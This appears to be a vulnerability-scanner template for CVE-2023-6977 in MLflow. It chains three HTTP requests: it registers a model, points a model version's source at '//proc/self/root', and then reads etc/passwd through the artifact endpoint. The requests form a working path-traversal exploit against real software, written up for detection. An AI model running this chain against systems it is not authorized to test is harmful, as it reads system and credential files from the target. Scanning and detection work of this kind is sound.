id: mlflow-arbitrary-file-read
info:
  name: MLflow Arbitrary File Read (CVE-2023-6977)
  author: YourName
  severity: high
  description: |
    This template detects the CVE-2023-6977 vulnerability in MLflow, which allows for arbitrary file read via path traversal.
  references:
    - https://github.com/advisories/GHSA-qg8p-32gr-gh6x
    - https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-6134596
    - https://advisories.gitlab.com/advisory/advpypi_mlflow_CVE_2023_6977.html

requests:
  - method: POST
    path:
      - "{{BaseURL}}/ajax-api/2.0/mlflow/registered-models/create"
    body: |
      {
        "name": "PoC"
      }
    headers:
      Content-Type: application/json
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "registered_model"

  - method: POST
    path:
      - "{{BaseURL}}/ajax-api/2.0/mlflow/model-versions/create"
    body: |
      {
        "name": "PoC",
        "source": "//proc/self/root"
      }
    headers:
      Content-Type: application/json
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "model_version"

  - method: GET
    path:
      - "{{BaseURL}}/model-versions/get-artifact?name=PoC&path=etc/passwd&version=1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:x:0:0:root"
